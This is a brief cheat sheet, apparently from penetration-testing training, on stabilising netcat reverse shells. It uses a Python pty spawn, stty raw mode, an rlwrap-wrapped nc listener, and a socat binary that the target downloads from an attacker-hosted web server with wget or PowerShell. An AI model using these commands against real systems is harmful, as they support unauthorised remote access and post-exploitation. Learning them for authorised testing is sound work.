Here's a concise summary of the commands used to stabilize netcat shells:

### **Technique 1: Python**
1. **Spawn a bash shell**:  
   ```bash
   python -c 'import pty;pty.spawn("/bin/bash")'
   ```
2. **Set terminal type**:  
   ```bash
   export TERM=xterm
   ```
3. **Background and stabilize the shell**:  
   - Press `Ctrl + Z`  
   - Run:  
     ```bash
     stty raw -echo; fg
     ```
4. **Fix terminal after shell dies**:  
   ```bash
   reset
   ```

---

### **Technique 2: rlwrap**
1. **Install rlwrap (if not already installed)**:  
   ```bash
   sudo apt install rlwrap
   ```
2. **Use rlwrap for the listener**:  
   ```bash
   rlwrap nc -lvnp <port>
   ```
3. **Stabilize the shell (optional)**:  
   - Background with `Ctrl + Z`  
   - Run:  
     ```bash
     stty raw -echo; fg
     ```

---

### **Technique 3: Socat**
1. **Set up a web server on the attacker machine**:  
   ```bash
   sudo python3 -m http.server 80
   ```
2. **Download the Socat binary on the target**:
   - Linux:  
     ```bash
     wget <LOCAL-IP>/socat -O /tmp/socat
     ```
   - Windows (PowerShell):  
     ```powershell
     Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows\Temp\socat.exe
     ```

---

### **Adjusting TTY Size**
1. **Find terminal dimensions** (on attacker):  
   ```bash
   stty -a
   ```
   - Note `rows` and `columns`.
2. **Set terminal dimensions** (on target):  
   ```bash
   stty rows <number>
   stty cols <number>
   ```
